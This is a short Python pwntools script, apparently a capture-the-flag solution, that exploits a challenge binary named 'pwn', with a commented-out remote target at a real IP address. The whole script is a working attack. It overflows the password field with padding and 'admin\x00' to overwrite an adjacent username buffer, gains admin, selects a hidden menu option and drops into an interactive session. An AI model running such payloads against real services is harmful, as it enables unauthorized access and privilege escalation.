#!/usr/bin/env python3

from pwn import *

HOST = "139.180.137.100"
PORT = 1337

context.binary = elf = ELF('./pwn', checksec = False)

p = process(elf.path)
# p = remote(HOST, PORT)

payload = b'x' * (0x80 - 0x40) + b'admin\x00' 
p.sendlineafter(b'3. Exit\n', b'2')
p.sendlineafter(b'Enter your username:\n', b'abc')
p.sendlineafter(b'Enter your passwd:\n', payload)
p.sendlineafter(b'3. Exit\n', b'4')

p.interactive()